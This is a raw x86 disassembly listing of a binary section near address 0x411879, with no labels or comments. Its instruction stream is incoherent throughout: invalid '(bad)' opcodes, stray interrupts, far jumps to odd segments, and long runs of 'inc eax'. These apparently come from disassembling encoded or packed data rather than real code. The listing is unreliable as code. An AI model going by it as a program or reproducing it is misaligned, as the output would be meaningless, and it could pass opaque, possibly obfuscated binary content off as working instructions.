  411879:	inc    eax
  41187a:	inc    eax
  41187b:	inc    eax
  41187c:	inc    eax
  41187d:	inc    eax
  41187e:	inc    eax
  41187f:	inc    eax
  411880:	lea    esp,[ebx+0x64]
  411883:	inc    ebx
  411884:	mov    ds:0xb67fd64,eax
  411889:	or     eax,0x91b49034
  41188e:	outs   dx,DWORD PTR ds:[esi]
  41188f:	pusha  
  411890:	inc    eax
  411891:	inc    eax
  411892:	inc    eax
  411893:	inc    eax
  411894:	inc    eax
  411895:	inc    eax
  411896:	rol    DWORD PTR [eax+0x40],0x94
  41189a:	mov    eax,0x7cfc4789
  41189f:	inc    eax
  4118a0:	sub    BYTE PTR [edx+0x54],ah
  4118a3:	lds    eax,FWORD PTR [ebx+0x68]
  4118a6:	mov    bl,0x7c
  4118a8:	inc    eax
  4118a9:	inc    eax
  4118aa:	add    BYTE PTR [eax+0x40],al
  4118ad:	inc    eax
  4118ae:	inc    eax
  4118af:	inc    eax
  4118b0:	inc    eax
  4118b1:	arpl   bp,cx
  4118b3:	xor    al,0xb8
  4118b5:	ror    DWORD PTR [esi+0x47],1
  4118b8:	adc    edx,edi
  4118ba:	and    edi,DWORD PTR [edi+0x55b0b944]
  4118c0:	test   DWORD PTR [ebp-0x7],ebx
  4118c3:	mov    esp,0x579b497b
  4118c8:	sbb    ch,al
  4118ca:	stc    
  4118cb:	sub    BYTE PTR [esp+ecx*1],0x40
  4118cf:	inc    eax
  4118d0:	inc    eax
  4118d1:	inc    eax
  4118d2:	inc    eax
  4118d3:	inc    eax
  4118d4:	inc    eax
  4118d5:	inc    eax
  4118d6:	inc    eax
  4118d7:	inc    eax
  4118d8:	int3   
  4118d9:	mov    bh,0x3
  4118db:	popa   
  4118dc:	or     ebx,ebx
  4118de:	add    dl,BYTE PTR [eax-0x75]
  4118e1:	aas    
  4118e2:	imul   esi,esp,0xffffff95
  4118e5:	add    ecx,eax
  4118e7:	inc    ecx
  4118e8:	pop    edi
  4118e9:	adc    eax,0x40406307
  4118ee:	inc    eax
  4118ef:	inc    eax
  4118f0:	inc    eax
  4118f1:	inc    eax
  4118f2:	int3   
  4118f3:	jne    0x411935
  4118f5:	(bad)  
  4118f6:	in     al,dx
  4118f7:	mov    ebx,0x5e933b43
  4118fc:	add    BYTE PTR [esp+edx*2+0x42],0x30
  411901:	xor    BYTE PTR [esi+0x40],al
  411904:	add    cl,al
  411906:	inc    eax
  411907:	inc    eax
  411908:	inc    eax
  411909:	inc    eax
  41190a:	add    BYTE PTR [eax-0x7a],al
  41190d:	int3   
  41190e:	lods   al,BYTE PTR ds:[esi]
  41190f:	xlat   BYTE PTR ds:[ebx]
  411911:	loopne 0x41196f
  411913:	icebp  
  411914:	es popf 
  411916:	or     esi,DWORD PTR [ebx+edi*4+0x47]
  41191a:	ja     0x41192e
  41191c:	pop    esi
  41191d:	fs xchg esp,eax
  41191f:	inc    eax
  411920:	inc    eax
  411921:	inc    eax
  411922:	inc    eax
  411923:	inc    eax
  411924:	inc    eax
  411925:	inc    eax
  411926:	inc    eax
  411927:	inc    DWORD PTR [eax+0x21]
  41192a:	or     eax,0x40751f85
  41192f:	mov    ah,0x62
  411931:	enterw 0x543,0x56
  411936:	cs fs aad 0x4c
  41193a:	inc    ebx
  41193b:	nop
  41193c:	stos   BYTE PTR es:[edi],al
  41193d:	xchg   ecx,eax
  41193e:	imul   eax,DWORD PTR [eax+0x40],0x40404040
  411945:	inc    eax
  411946:	inc    eax
  411947:	inc    eax
  411948:	inc    eax
  411949:	jge    0x41197e
  41194b:	adc    eax,0xdad64b9
  411950:	add    DWORD PTR [ebx-0x1f],ebp
  411953:	jle    0x4118d6
  411955:	inc    ebx
  411956:	aas    
  411957:	adc    eax,0x3afafb1f
  41195c:	jg     0x41192f
  41195e:	xor    dl,BYTE PTR [eax+0x3]
  411961:	mov    BYTE PTR [ebx],cl
  411963:	sbb    eax,0xd1600b44
  411968:	pusha  
  411969:	inc    eax
  41196a:	inc    eax
  41196b:	inc    eax
  41196c:	inc    eax
  41196d:	inc    eax
  41196e:	inc    eax
  41196f:	inc    eax
  411970:	inc    eax
  411971:	add    BYTE PTR ds:0xdc428095,bl
  411977:	xor    al,0x6d
  411979:	xor    BYTE PTR [edx+eiz*2+0x65],0xe8
  41197e:	aaa    
  41197f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411980:	icebp  
  411981:	and    dl,BYTE PTR [edx-0x33]
  411984:	push   ss
  411985:	dec    ebx
  411986:	cmp    esi,DWORD PTR ds:0x40404044
  41198c:	inc    eax
  41198d:	inc    eax
  41198e:	inc    eax
  41198f:	and    eax,0x60404040
  411994:	test   eax,0x41021045
  411999:	sub    BYTE PTR [ecx+0x0],dh
  41199c:	lods   al,BYTE PTR ds:[esi]
  41199d:	std    
  41199e:	arpl   ax,cx
  4119a0:	inc    ebx
  4119a1:	inc    eax
  4119a2:	inc    eax
  4119a3:	inc    eax
  4119a4:	inc    eax
  4119a5:	inc    eax
  4119a6:	inc    eax
  4119a7:	inc    eax
  4119a8:	inc    eax
  4119a9:	inc    eax
  4119aa:	inc    eax
  4119ab:	retf   0x27bf
  4119ae:	dec    ebx
  4119af:	jge    0x4119da
  4119b1:	mov    dh,0x30
  4119b3:	pop    ds
  4119b4:	dec    eax
  4119b5:	jp     0x411975
  4119b7:	sub    BYTE PTR [eax+0x72efdc41],ch
  4119bd:	pop    ecx
  4119be:	or     dl,BYTE PTR [bx+di]
  4119c1:	inc    edx
  4119c2:	inc    edi
  4119c3:	pop    es
  4119c4:	mov    eax,ds:0x48c57706
  4119c9:	enter  0xf685,0x55
  4119cd:	sub    al,0xdc
  4119cf:	inc    eax
  4119d0:	inc    eax
  4119d1:	inc    eax
  4119d2:	inc    eax
  4119d3:	inc    eax
  4119d4:	inc    eax
  4119d5:	rol    DWORD PTR [eax+0x40],0xab
  4119d9:	inc    ecx
  4119da:	mov    dh,0x43
  4119dc:	pop    ebp
  4119dd:	xchg   ecx,eax
  4119de:	adc    DWORD PTR [ecx-0x12],esp
  4119e1:	dec    edi
  4119e2:	or     eax,0x8035f390
  4119e7:	mov    esp,0x1c82cf8
  4119ec:	div    BYTE PTR es:[ebx]
  4119ef:	arpl   WORD PTR [esi],ax
  4119f1:	test   al,0x47
  4119f3:	inc    ebx
  4119f4:	call   0x4030:0xc1437f27
  4119fb:	inc    eax
  4119fc:	add    BYTE PTR [eax+0x40],al
  4119ff:	inc    eax
  411a00:	inc    eax
  411a01:	inc    eax
  411a02:	inc    eax
  411a03:	mov    eax,ds:0x850ef6d1
  411a08:	cld    
  411a09:	bound  edx,QWORD PTR [ebx+eax*8]
  411a0c:	fiadd  DWORD PTR [edi-0x2a87e5ef]
  411a12:	stos   DWORD PTR es:[edi],eax
  411a13:	inc    ebx
  411a14:	lds    ecx,FWORD PTR [ebx+0x56]
  411a17:	lds    eax,FWORD PTR [ecx+0x5b]
  411a1a:	mov    eax,0x40404142
  411a1f:	inc    eax
  411a20:	inc    eax
  411a21:	inc    eax
  411a22:	inc    eax
  411a23:	inc    eax
  411a24:	inc    eax
  411a25:	inc    eax
  411a26:	inc    eax
  411a27:	inc    edi
  411a28:	push   ecx
  411a29:	pop    edx
  411a2a:	lods   al,BYTE PTR ds:[esi]
  411a2b:	test   ebp,ebp
  411a2d:	sub    BYTE PTR [edx-0x583cf4ee],bl
  411a33:	aam    0x77
  411a35:	dec    ecx
  411a36:	inc    ecx
  411a37:	ins    BYTE PTR es:[edi],dx
  411a38:	mov    ch,0xab
  411a3a:	std    
  411a3b:	dec    eax
  411a3c:	arpl   WORD PTR [edx],ax
  411a3e:	inc    ebx
  411a3f:	xchg   ebx,eax
  411a40:	test   ecx,0xc8486239
  411a46:	xor    BYTE PTR [edi+0x4040ef64],ah
  411a4c:	inc    eax
  411a4d:	inc    eax
  411a4e:	inc    eax
  411a4f:	inc    eax
  411a50:	int3   
  411a51:	jne    0x411a93
  411a53:	fs int 0x69
  411a56:	mov    edx,0x5a913dd8
  411a5b:	bound  edx,QWORD PTR [edi+0x7d]
  411a5e:	inc    ecx
  411a5f:	inc    edi
  411a60:	rol    DWORD PTR [ebx],1
  411a62:	ret    0x4028
  411a65:	add    cl,al
  411a67:	inc    eax
  411a68:	inc    eax
  411a69:	inc    eax
  411a6a:	inc    eax
  411a6b:	add    BYTE PTR [eax-0x73],al
  411a6e:	addr16 jae 0x4119f6
  411a71:	or     eax,0xe073333
  411a76:	pop    ss
  411a77:	cmp    al,0x43
  411a79:	ret    
  411a7a:	jbe    0x411acd
  411a7c:	mov    bl,0x78
  411a7e:	cld    
  411a7f:	retf   
  411a80:	inc    eax
  411a81:	inc    eax
  411a82:	inc    eax
  411a83:	inc    eax
  411a84:	inc    eax
  411a85:	inc    eax
  411a86:	inc    eax
  411a87:	inc    eax
  411a88:	inc    DWORD PTR [eax-0x70]
  411a8b:	test   al,0x93
  411a8d:	rcr    DWORD PTR [ebp+0x62],0x65
  411a91:	mov    edx,0x1b0d721e
  411a96:	faddp  st(5),st
  411a98:	or     DWORD PTR ds:0x4040f643,ecx
  411a9e:	inc    eax
  411a9f:	inc    eax
  411aa0:	inc    eax
  411aa1:	inc    eax
  411aa2:	inc    eax
  411aa3:	inc    eax
  411aa4:	inc    eax
  411aa5:	inc    eax
  411aa6:	repz rol DWORD PTR [edi+eiz*1-0x8],0xc8
  411aac:	ror    ebx,1
  411aae:	sbb    DWORD PTR [esi+0x4672e144],eax
  411ab4:	xchg   ebp,eax
  411ab5:	cmp    al,0x93
  411ab7:	int    0xd9
  411ab9:	imul   eax,DWORD PTR [edx-0x47],0x75
  411abd:	ror    DWORD PTR [ebx+0x3f],0x4f
  411ac1:	sbb    al,0x28
  411ac3:	add    DWORD PTR [eax+0x40],0x40404040
  411aca:	inc    eax
  411acb:	inc    eax
  411acc:	add    ch,bh
  411ace:	sub    DWORD PTR [ecx-0x40],ebx
  411ad1:	inc    ebx
  411ad2:	bound  esp,QWORD PTR [esi+0xdec7744]
  411ad8:	mov    dh,0xfd
  411ada:	cld    
  411adb:	dec    ecx
  411adc:	jno    0x411b1f
  411ade:	(bad)  
  411ae1:	push   0x4330ddc5
  411ae6:	sub    ch,BYTE PTR [ecx+0x4d4fedfc]
  411aec:	ins    DWORD PTR es:[edi],dx
  411aed:	xor    BYTE PTR [ecx+0x40400cbe],bh
  411af3:	inc    eax
  411af4:	inc    eax
  411af5:	inc    eax
  411af6:	inc    eax
  411af7:	and    eax,0xf4404040
  411afc:	dec    eax
  411afd:	outs   dx,BYTE PTR ds:[esi]
  411afe:	in     al,0xd4
  411b00:	push   ebx
  411b01:	sub    al,0x75
  411b03:	bound  eax,QWORD PTR [ecx-0x4f]
  411b06:	ds inc edi
  411b08:	adc    dh,BYTE PTR [ecx-0x3d]
  411b0b:	test   al,0x4b
  411b0d:	push   ebx
  411b0e:	in     al,0x85
  411b10:	mov    ebx,0xf805504b
  411b15:	xlat   BYTE PTR ds:[ebx]
  411b16:	push   edx
  411b17:	inc    ebx
  411b18:	aam    0x73
  411b1a:	ret    
  411b1b:	retf   
  411b1c:	enter  0x6dd0,0x90
  411b20:	mov    es,WORD PTR [eax+0x40]
  411b23:	inc    eax
  411b24:	inc    eax
  411b25:	inc    eax
  411b26:	inc    eax
  411b27:	inc    eax
  411b28:	inc    eax
  411b29:	inc    eax
  411b2a:	inc    eax
  411b2b:	pop    esp
  411b2c:	ja     0x411b7e
  411b2e:	arpl   WORD PTR [esp+eiz*4+0x3b],sp
  411b32:	div    BYTE PTR [ebp+0x253141c1]
  411b38:	or     al,0x47
  411b3a:	push   eax
  411b3b:	dec    esp
  411b3c:	test   esp,ebp
  411b3e:	inc    eax
  411b3f:	inc    eax
  411b40:	inc    eax
  411b41:	inc    eax
  411b42:	inc    eax
  411b43:	inc    eax
  411b44:	rol    DWORD PTR [eax+0x40],0xdc
  411b48:	mov    ecx,0x3292c5d8
  411b4d:	ret    
  411b4e:	xchg   esp,eax
  411b4f:	movq   QWORD PTR ds:0x6e6ea0e7,mm2
  411b56:	push   edx
  411b57:	lds    ebx,FWORD PTR [esi]
  411b59:	and    al,0x40
  411b5b:	inc    eax
  411b5c:	add    BYTE PTR [eax+0x40],al
  411b5f:	inc    eax
  411b60:	inc    eax
  411b61:	inc    eax
  411b62:	inc    eax
  411b63:	adc    edx,DWORD PTR [eax+ecx*2+0x634bacc0]
  411b6a:	bound  ebp,QWORD PTR [edi+0x82e5001]
  411b70:	fmul   DWORD PTR [ebp+0x1]
  411b73:	(bad)  
  411b74:	in     eax,0x2d
  411b76:	pop    eax
  411b77:	dec    ebp
  411b78:	clc    
  411b79:	xor    al,0xa7
  411b7b:	inc    ecx
  411b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b7d:	inc    ebp
  411b7e:	shl    DWORD PTR [ebx-0x16],0x40
  411b82:	sub    DWORD PTR [ebx-0x5c],eax
  411b85:	repnz cmp eax,0x40404040
  411b8b:	inc    eax
  411b8c:	inc    eax
  411b8d:	inc    eax
  411b8e:	inc    eax
  411b8f:	inc    eax
  411b90:	inc    eax
  411b91:	push   edi
  411b92:	arpl   WORD PTR [ecx+eax*2+0x4db59730],di
  411b99:	test   al,0xd2
  411b9b:	inc    ecx
  411b9c:	mov    al,dl
  411b9e:	or     BYTE PTR [esi-0x3e],ch
  411ba1:	xor    eax,0x47c311e8
  411ba6:	mov    WORD PTR [ebp+0x35],es
  411ba9:	inc    ebp
  411baa:	ins    DWORD PTR es:[edi],dx
  411bab:	add    al,0x58
  411bad:	test   DWORD PTR [esi+0x4040409b],edi
  411bb3:	inc    eax
  411bb4:	inc    eax
  411bb5:	inc    eax
  411bb6:	int3   
  411bb7:	jne    0x411bf9
  411bb9:	rcl    ah,1
  411bbb:	and    eax,0xf7430262
  411bc0:	inc    edx
  411bc1:	shl    DWORD PTR [esi],0x66
  411bc4:	xor    al,0xcb
  411bc6:	nop
  411bc7:	jmp    0x411b7c
  411bc9:	and    bl,BYTE PTR [ebx]
  411bcb:	out    0x7e,al
  411bcd:	dec    esp
  411bce:	fcomp  DWORD PTR [eax]
  411bd0:	inc    ecx
  411bd1:	ret    
  411bd2:	rol    DWORD PTR ds:0x56604469,0x50
  411bd9:	dec    ecx
  411bda:	aaa    
  411bdb:	sbb    esp,DWORD PTR [edx-0x2c]
  411bde:	icebp  
  411bdf:	xchg   esp,eax
  411be0:	inc    eax
  411be1:	add    cl,al
  411be3:	inc    eax
  411be4:	inc    eax
  411be5:	inc    eax
  411be6:	inc    eax
  411be7:	add    BYTE PTR [eax+0x33],al
  411bea:	(bad)  
  411beb:	cld    
  411bec:	cli    
  411bed:	es je  0x411c29
  411bf0:	xchg   BYTE PTR [ecx+0x2d],al
  411bf3:	(bad)  
  411bf4:	clc    
  411bf5:	dec    ebp
  411bf6:	bound  ebx,QWORD PTR [ecx+0x2453bc5]
  411bfc:	in     al,0xa8
  411bfe:	inc    ebp
  411bff:	addr16 mov dl,0x40
  411c02:	inc    eax
  411c03:	inc    eax
  411c04:	inc    eax
  411c05:	inc    eax
  411c06:	inc    eax
  411c07:	inc    eax
  411c08:	inc    eax
  411c09:	inc    DWORD PTR [eax+0x42]
  411c0c:	ror    DWORD PTR [eax],0x66
  411c0f:	adc    ah,ah
  411c11:	inc    ebx
  411c12:	jg     0x411c24
  411c14:	icebp  
  411c15:	push   edx
  411c16:	mov    esi,0xc633c4b4
  411c1b:	daa    
  411c1c:	ret    
  411c1d:	adc    ah,dl
  411c1f:	inc    edx
  411c20:	dec    edi
  411c21:	int3   
  411c22:	add    DWORD PTR [esi],esi
  411c24:	sti    
  411c25:	test   al,0x56
  411c27:	call   0x154c:0x41bd4741
  411c2e:	mov    cl,0x40
  411c30:	inc    edx
  411c31:	test   DWORD PTR [eax+0x40],eax
  411c34:	inc    eax
  411c35:	inc    eax
  411c36:	inc    eax
  411c37:	inc    eax
  411c38:	inc    eax
  411c39:	inc    eax
  411c3a:	inc    eax
  411c3b:	inc    eax
  411c3c:	and    al,0x71
  411c3e:	ror    ch,0xe0
  411c41:	fs dec edi
  411c43:	inc    ebx
  411c44:	pop    esi
  411c45:	sub    BYTE PTR [eax+0x40],ah
  411c48:	pop    ecx
  411c49:	fsub   st,st(4)
  411c4b:	nop
  411c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c4d:	push   ecx
  411c4e:	push   esi
  411c4f:	inc    edx
  411c50:	mov    ebp,0xbbf54228
  411c55:	dec    esi
  411c56:	shr    BYTE PTR [eax],0xde
  411c59:	push   esi
  411c5a:	les    eax,FWORD PTR [ebx-0x68]
  411c5d:	xchg   edx,eax
  411c5e:	sub    DWORD PTR [eax+0x40],eax
  411c61:	inc    eax
  411c62:	inc    eax
  411c63:	inc    eax
  411c64:	inc    eax
  411c65:	inc    eax
  411c66:	inc    eax
  411c67:	add    al,ah
  411c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c6a:	xor    eax,0x2a29d170
  411c6f:	inc    edx
  411c70:	bound  edi,QWORD PTR [ebp-0x5f94ad80]
  411c76:	add    al,al
  411c78:	sub    ah,bl
  411c7a:	lds    esi,FWORD PTR [ecx+ebp*1]
  411c7d:	mov    esi,DWORD PTR [ebx+0x1a]
  411c80:	add    al,0xd
  411c82:	dec    eax
  411c83:	nop
  411c84:	fisttp QWORD PTR [esi]
  411c86:	inc    edx
  411c87:	outs   dx,DWORD PTR ds:[esi]
  411c88:	bound  esp,QWORD PTR ds:0x40dc6342
  411c8e:	inc    eax
  411c8f:	inc    eax
  411c90:	inc    eax
  411c91:	inc    eax
  411c92:	inc    eax
  411c93:	and    eax,0xce404040
  411c98:	mov    ah,0xc7
  411c9a:	add    eax,0x4141fde6
  411c9f:	sbb    BYTE PTR [esi+0x55],ch
  411ca2:	xchg   ecx,edi
  411ca4:	enter  0x437c,0xa6
  411ca8:	inc    eax
  411ca9:	rcl    ebp,0x19
  411cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cad:	enter  0x930,0x40
  411cb1:	inc    eax
  411cb2:	inc    eax
  411cb3:	inc    eax
  411cb4:	inc    eax
  411cb5:	inc    eax
  411cb6:	inc    eax
  411cb7:	inc    eax
  411cb8:	inc    eax
  411cb9:	inc    eax
  411cba:	push   edx
  411cbb:	jmp    0x411cf7
  411cbd:	xor    eax,0xadc854a8
  411cc2:	lods   eax,DWORD PTR ds:[esi]
  411cc3:	outs   dx,BYTE PTR ds:[esi]
  411cc4:	gs inc edi
  411cc6:	adc    esi,esi
  411cc8:	inc    eax
  411cc9:	inc    eax
  411cca:	inc    eax
  411ccb:	inc    eax
  411ccc:	inc    eax
  411ccd:	inc    eax
  411cce:	rol    DWORD PTR [eax+0x40],0x47
  411cd2:	push   ds
  411cd3:	aaa    
  411cd4:	retf   0x4111
  411cd7:	push   eax
  411cd8:	dec    edi
  411cd9:	test   edx,ecx
  411cdb:	inc    eax
  411cdc:	xor    bl,BYTE PTR [edx+0x77]
  411cdf:	inc    ecx
  411ce0:	inc    edx
  411ce1:	inc    ebx
  411ce2:	rcl    BYTE PTR [eax+0x59],1
  411ce5:	sub    eax,0x90db09cc
  411cea:	xor    al,0x6f
  411cec:	rcl    BYTE PTR [ebx+0x40],0x40
  411cf0:	add    BYTE PTR [eax+0x40],al
  411cf3:	inc    eax
  411cf4:	inc    eax
  411cf5:	inc    eax
  411cf6:	inc    eax
  411cf7:	inc    ecx
  411cf8:	cmp    BYTE PTR [edx+edx*4+0x17],al
  411cfc:	inc    eax
  411cfd:	aaa    
  411cfe:	enter  0xbca7,0x60
  411d02:	inc    ebx
  411d03:	fwait
  411d04:	lock pop ecx
  411d06:	add    al,0xa9
  411d08:	add    eax,0x306ad147
  411d0d:	lds    eax,FWORD PTR [ebx-0x44]
  411d10:	leave  
  411d11:	inc    eax
  411d12:	inc    eax
  411d13:	inc    eax
  411d14:	inc    eax
  411d15:	inc    eax
  411d16:	inc    eax
  411d17:	inc    eax
  411d18:	inc    eax
  411d19:	inc    eax
  411d1a:	inc    eax
  411d1b:	cmp    BYTE PTR [edi],cl
  411d1d:	stos   BYTE PTR es:[edi],al
  411d1e:	inc    eax
  411d1f:	add    eax,0x154050d
  411d24:	jo     0x411d99
  411d26:	push   eax
  411d27:	shr    DWORD PTR [eax-0x37],0x40
  411d2b:	inc    eax
  411d2c:	inc    eax
  411d2d:	inc    eax
  411d2e:	inc    eax
  411d2f:	inc    eax
  411d30:	int3   
  411d31:	jne    0x411d73
  411d33:	inc    ecx
  411d34:	(bad)  
  411d35:	arpl   WORD PTR [esi],cx
  411d37:	xor    al,0x64
  411d39:	pop    ecx
  411d3a:	cld    
  411d3b:	cs push 0xc312c96e
  411d41:	dec    edx
  411d42:	push   ebp
  411d43:	pop    eax
  411d44:	fild   DWORD PTR [ecx+0x40]
  411d47:	repnz push esp
  411d49:	mov    eax,ds:0x435b6304
  411d4e:	inc    eax
  411d4f:	adc    eax,0x36cd6ac0
  411d54:	bound  eax,QWORD PTR [eax+0x0]
  411d57:	rol    DWORD PTR [eax+0x40],0x40
  411d5b:	inc    eax
  411d5c:	add    BYTE PTR [eax+0x30],al
  411d5f:	inc    eax
  411d60:	jp     0x411d51
  411d62:	out    dx,al
  411d63:	inc    eax
  411d64:	and    eax,0x160cc434
  411d69:	and    al,0x54
  411d6b:	xchg   ecx,eax
  411d6c:	fisttp QWORD PTR [ecx-0x276bbfb9]
  411d72:	arpl   WORD PTR [ecx-0x27],cx
  411d75:	lds    eax,FWORD PTR [ebp-0x253ec8ee]
  411d7b:	ja     0x411dc9
  411d7d:	inc    edi
  411d7e:	pusha  
  411d7f:	inc    eax
  411d80:	jg     0x411dc2
  411d82:	inc    eax
  411d83:	inc    eax
  411d84:	inc    eax
  411d85:	inc    eax
  411d86:	inc    eax
  411d87:	inc    eax
  411d88:	inc    eax
  411d89:	inc    DWORD PTR [eax+0x4d]
  411d8c:	cmp    ah,cl
  411d8e:	arpl   WORD PTR [eax],cx
  411d90:	lock adc eax,0xf962c311
  411d96:	pop    esp
  411d97:	mul    BYTE PTR [eax+eax*2-0x750beeb9]
  411d9e:	or     eax,0xd06eaf4f
  411da3:	rcl    ah,0x5
  411da6:	retf   
  411da7:	dec    esp
  411da8:	inc    ebx
  411da9:	inc    eax
  411daa:	ins    DWORD PTR es:[edi],dx
  411dab:	and    eax,0x404040ea
  411db0:	inc    eax
  411db1:	inc    eax
  411db2:	inc    eax
  411db3:	inc    eax
  411db4:	inc    eax
  411db5:	inc    eax
  411db6:	inc    eax
  411db7:	cmovno eax,DWORD PTR ds:0x3e4e0ed2
  411dbe:	inc    ebx
  411dbf:	daa    
  411dc0:	inc    ecx
  411dc1:	retf   
  411dc2:	dec    edx
  411dc3:	inc    eax
  411dc4:	rol    ecx,1
  411dc6:	jge    0x411d50
  411dc8:	lds    edi,FWORD PTR [eax+0x642a0f13]
  411dce:	jns    0x411e4b
  411dd0:	enter  0x9b15,0x40
  411dd4:	repz sar BYTE PTR [edi],0xbd
  411dd8:	pop    ebp
  411dd9:	enter  0x4040,0x40
  411ddd:	inc    eax
  411dde:	inc    eax
  411ddf:	inc    eax
  411de0:	inc    eax
  411de1:	inc    eax
  411de2:	add    BYTE PTR [eax],bl
  411de4:	or     DWORD PTR [ebx],ebx
  411de6:	pusha  
  411de7:	dec    esp
  411de8:	xchg   BYTE PTR [eax+ecx*2],dh
  411deb:	inc    ecx
  411dec:	inc    eax
  411ded:	inc    ebp
  411dee:	bound  ecx,QWORD PTR ss:0x1443ba44
  411df5:	mov    cl,0x7d
  411df7:	inc    ebx
  411df8:	inc    eax
  411df9:	inc    eax
  411dfa:	inc    eax
  411dfb:	inc    eax
  411dfc:	inc    eax
  411dfd:	inc    eax
  411dfe:	and    eax,0x69404040
  411e03:	xor    DWORD PTR cs:[eax],0x7cc46440
  411e0a:	xchg   BYTE PTR [edx-0x50],bh
  411e0d:	rol    BYTE PTR [ebx],0xb5
  411e10:	outs   dx,DWORD PTR ss:[esi]
  411e12:	test   BYTE PTR [ebp+edx*1+0x47],al
  411e16:	inc    eax
  411e17:	jle    0x411e2c
  411e19:	ret    0x6505
  411e1c:	test   DWORD PTR [ebp+0x40404040],0x40404040
  411e26:	inc    eax
  411e27:	inc    eax
  411e28:	adc    eax,0x3ac0c811
  411e2d:	inc    ebx
  411e2e:	dec    edi
  411e2f:	inc    ebx
  411e30:	inc    eax
  411e31:	inc    ebp
  411e32:	add    al,0x44
  411e34:	jmp    0x3331:0x1290bd30
  411e3b:	push   eax
  411e3c:	clc    
  411e3d:	fisttp WORD PTR ds:0x4040404c
  411e43:	inc    eax
  411e44:	inc    eax
  411e45:	inc    eax
  411e46:	rol    DWORD PTR [eax+0x40],0x40
  411e4a:	inc    ebx
  411e4b:	ret    0x82d9
  411e4e:	dec    esp
  411e4f:	enter  0x144a,0x51
  411e53:	xor    bl,BYTE PTR [ebp+edx*1+0x40004040]
  411e5a:	inc    eax
  411e5b:	inc    eax
  411e5c:	inc    eax
  411e5d:	inc    eax
  411e5e:	inc    eax
  411e5f:	arpl   WORD PTR [eax+0x451f40d9],si
  411e65:	add    DWORD PTR [edi+0x10],esi
  411e68:	or     eax,0xc57313be
  411e6d:	mov    ah,0xef
  411e6f:	inc    eax
  411e70:	retf   0x4040
  411e73:	inc    eax
  411e74:	inc    eax
  411e75:	inc    eax
  411e76:	inc    eax
  411e77:	inc    eax
  411e78:	inc    eax
  411e79:	inc    eax
  411e7a:	inc    eax
  411e7b:	mov    DWORD PTR [eax+0x41],0x31fad8c2
  411e82:	mov    al,0x2e
  411e84:	push   cs
  411e85:	repnz rcl DWORD PTR [eax+eax*4+0x4040406b],0x40
  411e8e:	inc    eax
  411e8f:	inc    eax
  411e90:	int3   
  411e91:	jne    0x411ed3
  411e93:	add    eax,0xeb044049
  411e98:	mov    al,0x94
  411e9a:	push   edi
  411e9b:	leave  
  411e9c:	inc    ecx
  411e9d:	or     DWORD PTR [esi+0x404101],edi
  411ea3:	rol    DWORD PTR [eax+0x40],0x40
  411ea7:	inc    eax
  411ea8:	add    BYTE PTR [eax-0x56],al
  411eab:	xor    eax,0x53404326
  411eb0:	shr    BYTE PTR [ebp+0x304abffe],0x1f
  411eb7:	mov    eax,0xb8059709
  411ebc:	inc    esp
  411ebd:	cmp    al,0x40
  411ebf:	xor    esp,DWORD PTR [eax+ebp*4+0x6a]
  411ec3:	cmp    eax,0x40404040
  411ec8:	inc    eax
  411ec9:	inc    eax
  411eca:	inc    eax
  411ecb:	inc    eax
  411ecc:	inc    DWORD PTR [eax-0x35]
  411ecf:	inc    edi
  411ed0:	adc    al,0x5c
  411ed2:	rcl    DWORD PTR [esi+edx*4+0x408526c3],0x31
  411eda:	arpl   WORD PTR [edx],sp
  411edc:	cld    
  411edd:	inc    ebx
  411ede:	test   al,0x43
  411ee0:	adc    bh,al
  411ee2:	ret    0x153a
  411ee5:	ja     0x411efc
  411ee7:	nop
  411ee8:	inc    eax
  411ee9:	aad    0x17
  411eeb:	lods   al,BYTE PTR ds:[esi]
  411eec:	push   0x4040405c
  411ef1:	inc    eax
  411ef2:	inc    eax
  411ef3:	inc    eax
  411ef4:	inc    eax
  411ef5:	inc    eax
  411ef6:	inc    eax
  411ef7:	inc    eax
  411ef8:	retf   
  411ef9:	imul   ebx,DWORD PTR [ecx],0xe2644167
  411eff:	push   edx
  411f00:	aas    
  411f01:	push   edx
  411f02:	inc    eax
  411f03:	repz inc esi
  411f05:	inc    eax
  411f06:	inc    eax
  411f07:	inc    eax
  411f08:	inc    eax
  411f09:	inc    eax
  411f0a:	inc    eax
  411f0b:	inc    eax
  411f0c:	inc    eax
  411f0d:	add    BYTE PTR [ebx-0x1e5e8e06],ah
  411f13:	adc    ch,BYTE PTR [esi+0x60]
  411f16:	sbb    WORD PTR [eax],di
  411f19:	ret    
  411f1a:	or     eax,0xdd4f3240
  411f1f:	xor    eax,0x328bd63
  411f24:	xor    eax,0x7d466342
  411f29:	or     eax,0xf554406f
  411f2e:	sub    eax,DWORD PTR [ecx-0x58]
  411f31:	test   BYTE PTR [ebx+0x5],0x40
  411f35:	inc    eax
  411f36:	inc    eax
  411f37:	inc    eax
  411f38:	inc    eax
  411f39:	inc    eax
  411f3a:	and    eax,0x51404040
  411f3f:	jle    0x411f85
  411f41:	dec    ebx
  411f42:	adc    cl,BYTE PTR [edi+0x33]
  411f45:	inc    eax
  411f46:	std    
  411f47:	push   ecx
  411f48:	push   esp
  411f49:	clc    
  411f4a:	dec    eax
  411f4b:	bound  edi,QWORD PTR [eax]
  411f4d:	add    al,0x1a
  411f4f:	inc    eax
  411f50:	mov    edi,0x47344106
  411f55:	inc    eax
  411f56:	push   ebp
  411f57:	and    ch,BYTE PTR [eax-0x7aa31695]
  411f5d:	inc    eax
  411f5e:	push   es
  411f5f:	inc    eax
  411f60:	sub    esi,DWORD PTR [ecx]
  411f62:	jl     0x411fa4
  411f64:	inc    ebx
  411f65:	inc    eax
  411f66:	inc    eax
  411f67:	inc    eax
  411f68:	inc    eax
  411f69:	inc    eax
  411f6a:	inc    eax
  411f6b:	inc    eax
  411f6c:	inc    eax
  411f6d:	inc    eax
  411f6e:	inc    eax
  411f6f:	inc    eax
  411f70:	ss jl  0x411fad
  411f73:	mov    WORD PTR [edx+0x17],fs
  411f76:	nop
  411f77:	inc    eax
  411f78:	cmp    dl,BYTE PTR [ebp+0x63]
  411f7b:	inc    ebp
  411f7c:	or     eax,0x6b40062c
  411f81:	inc    eax
  411f82:	inc    eax
  411f83:	inc    eax
  411f84:	inc    eax
  411f85:	inc    eax
  411f86:	inc    eax
  411f87:	rol    DWORD PTR [eax+0x40],0x40
  411f8b:	repnz xor ebx,ecx
